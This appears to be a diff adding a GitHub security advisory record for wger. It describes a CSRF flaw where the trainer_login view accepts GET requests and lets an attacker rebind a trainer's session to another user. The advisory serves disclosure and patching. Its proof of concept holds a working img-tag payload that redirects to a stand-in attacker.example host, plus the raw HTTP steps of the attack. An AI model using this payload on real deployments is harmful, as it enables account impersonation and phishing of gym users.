@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-xf64-4pmc-h8qf",
+  "modified": "2026-10-07T14:00:04.675423309Z",
+  "published": "2026-10-07T13:45:33Z",
+  "aliases": [
+    "CVE-2026-45161"
+  ],
+  "summary": "wger: trainer_login accepts GET - CSRF bypass enables forced session rebinding",
+  "details": "### Summary\n\nThe `trainer_login` view in wger accepts GET requests and executes `django_login()` without any CSRF protection, because Django's `CsrfViewMiddleware` only enforces tokens on unsafe methods (POST/PUT/PATCH/DELETE). An attacker can embed a single `\u003cimg\u003e` tag on a malicious page; when an authenticated trainer loads that page, their browser auto-issues the GET with the session cookie, forcibly rebinding the trainer's session to an arbitrary user account.\n\n### Details\n\n**File**: `wger/core/views/user.py`, approximately lines 161-210\n\n```python\n# VULNERABLE - no @require_POST, no request.method == 'POST' guard\n# CsrfViewMiddleware is bypassed because CSRF enforcement only applies to\n# unsafe HTTP methods (POST, PUT, PATCH, DELETE)\ndef trainer_login(request, user_pk):\n    ...\n    django_login(request, user, backend='django.contrib.auth.backends.ModelBackend')\n    return HttpResponseRedirect(...)\n```\n\nBecause the view handles GET, Django's CSRF middleware does not validate any token. An attacker can place `\u003cimg src=\"https://wger.target/en/user/2/trainer-login\"\u003e` on any web page. When an authenticated trainer's browser loads that page, it issues the GET request with the session cookie attached (SameSite=Lax does not block same-site top-level navigation and subresource hops triggered by same-origin redirects). The server executes `django_login()` and issues a new session cookie binding the trainer to the victim user.\n\nPlaywright-verified in Chromium 147: the SameSite bypass occurs via a `?next=` redirect chain - the initial cross-origin subresource hop is blocked by SameSite, but the server's `302 -\u003e /user/login?next=...` redirect causes the browser to follow a same-origin hop that attaches the cookie, and the subsequent redirect to the original URL executes the action.\n\n**Affected endpoint**:\n- `GET /en/user/\u003cuser_pk\u003e/trainer-login` -\u003e `wger.core.views.user.trainer_login`\n\n**Suggested patch**:\n\n```diff\n--- a/wger/core/views/user.py\n+++ b/wger/core/views/user.py\n+from django.views.decorators.http import require_POST\n+\n @login_required()\n+@require_POST\n def trainer_login(request, user_pk):\n     ...\n-    # Move ?next= handling to POST body - never use GET params for\n-    # security-sensitive redirects\n+    next_url = request.POST.get('next', reverse('core:index'))\n+    if not url_has_allowed_host_and_scheme(next_url, allowed_hosts={request.get_host()}):\n+        next_url = reverse('core:index')\n     return HttpResponseRedirect(next_url)\n```\n\nRequiring POST ensures Django's CSRF middleware validates the `csrfmiddlewaretoken` on every impersonation request, eliminating the CSRF vector. Moving `next` to the POST body also removes the open-redirect surface (submitted separately).\n\n### PoC\n\nTested on `wger/server:latest` Docker image + Playwright/Chromium 147. Victim: `trainer1` (`gym.gym_trainer` permission).\n\nStep 1 - Attacker hosts malicious page:\n\n```html\n\u003c!-- evil.html --\u003e\n\u003cimg src=\"http://target/en/user/2/trainer-login?next=//attacker.example/exfil\"\n     width=\"1\" height=\"1\"\u003e\n```\n\nStep 2 - Authenticated trainer loads evil.html. Browser auto-issues:\n\n```\nGET /en/user/2/trainer-login?next=//attacker.example/exfil HTTP/1.1\nHost: target\nCookie: sessionid=[trainer1_session]\n(no CSRF token required)\n```\n\nStep 3 - Server responds:\n\n```\nHTTP/1.1 302 Found\nLocation: //attacker.example/exfil\nSet-Cookie: sessionid=[alice_session]   \u003c- session rebound to alice\n```\n\nStep 4 - Confirm impersonation:\n\n```\nGET /api/v2/userprofile/ HTTP/1.1\nCookie: sessionid=[alice_session]\n\n-\u003e 200 OK: {\"username\":\"alice\",...}\n```\n\nReproducibility: 2/2 runs. Playwright browser verification confirmed SameSite=Lax is bypassed via the server's own `?next=` redirect chain.\n\n### Impact\n\nAn attacker who can cause an authenticated trainer to load a malicious page (phishing email, malicious link, third-party gym management tool integration, ad network, comment section with images) can forcibly switch the trainer's session to any user account in the gym - without the trainer's awareness or consent. The trainer's browser is then operating as the victim user. Combined with the `?next=` parameter, the post-impersonation redirect can send the trainer to the attacker's domain, amplifying phishing and credential-harvesting attacks.\n\nThis CSRF primitive is the delivery vector that unlocks the `trainer_login` scope bypass (separate submission) without requiring the attacker to compromise the trainer's credentials directly.\n\n**Affected deployments**: every wger instance where `gym.gym_trainer` is delegated to non-admin users.\n\n**Severity**: Medium (CVSS 5.4). Network-reachable, low complexity, low privilege (trainer role required as victim), requires page load (UI:R), scope change (attacker's origin via redirect).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wger",
+        "purl": "pkg:pypi/wger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2rc1",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-xf64-4pmc-h8qf/GHSA-xf64-4pmc-h8qf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/security/advisories/GHSA-xf64-4pmc-h8qf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wger-project/wger"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/releases/tag/2.6"
+    }
+  ]
+}
